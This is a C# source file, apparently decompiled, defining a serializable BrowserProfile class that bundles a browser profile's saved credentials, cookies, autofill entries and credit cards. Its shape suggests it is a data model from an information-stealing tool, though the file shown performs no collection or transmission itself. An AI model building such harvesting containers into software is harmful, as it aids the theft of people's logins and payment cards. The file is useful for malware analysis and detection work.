using ProtoBuf;
using System.Collections.Generic;
using System.ComponentModel;

namespace NoiseMe.Drags.App.Models.Common
{
	[ProtoContract(Name = "BrowserProfile")]
	public class BrowserProfile : INotifyPropertyChanged, IEqualityComparer<BrowserProfile>
	{
		private string _name;

		private string _profile;

		private List<BrowserCredendtial> _browserCredendtials;

		private List<BrowserCookie> _browserCookies;

		private List<BrowserAutofill> _browserAutofills;

		private List<BrowserCreditCard> _browserCreditCards;

		[ProtoMember(1, Name = "Name")]
		public string Name
		{
			get
			{
				return _name;
			}
			set
			{
				_name = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("Name"));
			}
		}

		[ProtoMember(2, Name = "Profile")]
		public string Profile
		{
			get
			{
				return _profile;
			}
			set
			{
				_profile = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("Profile"));
			}
		}

		[ProtoMember(3, Name = "BrowserCredendtials")]
		public List<BrowserCredendtial> BrowserCredendtials
		{
			get
			{
				return _browserCredendtials ?? (_browserCredendtials = new List<BrowserCredendtial>());
			}
			set
			{
				_browserCredendtials = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("BrowserCredendtials"));
			}
		}

		[ProtoMember(4, Name = "BrowserCookies")]
		public List<BrowserCookie> BrowserCookies
		{
			get
			{
				return _browserCookies ?? (_browserCookies = new List<BrowserCookie>());
			}
			set
			{
				_browserCookies = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("BrowserCookies"));
			}
		}

		[ProtoMember(5, Name = "BrowserAutofill")]
		public List<BrowserAutofill> BrowserAutofills
		{
			get
			{
				return _browserAutofills ?? (_browserAutofills = new List<BrowserAutofill>());
			}
			set
			{
				_browserAutofills = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("BrowserAutofills"));
			}
		}

		[ProtoMember(6, Name = "BrowserCreditCard")]
		public List<BrowserCreditCard> BrowserCreditCards
		{
			get
			{
				return _browserCreditCards ?? (_browserCreditCards = new List<BrowserCreditCard>());
			}
			set
			{
				_browserCreditCards = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("BrowserCreditCards"));
			}
		}

		public event PropertyChangedEventHandler PropertyChanged;

		public bool Equals(BrowserProfile x, BrowserProfile y)
		{
			if (x.Name == y.Name)
			{
				return x.Profile == y.Profile;
			}
			return false;
		}

		public int GetHashCode(BrowserProfile obj)
		{
			int num = 37;
			num *= 397;
			if (!string.IsNullOrEmpty(obj.Name))
			{
				num += obj.Name.GetHashCode();
			}
			if (!string.IsNullOrEmpty(obj.Profile))
			{
				num += obj.Profile.GetHashCode();
			}
			return num;
		}
	}
}
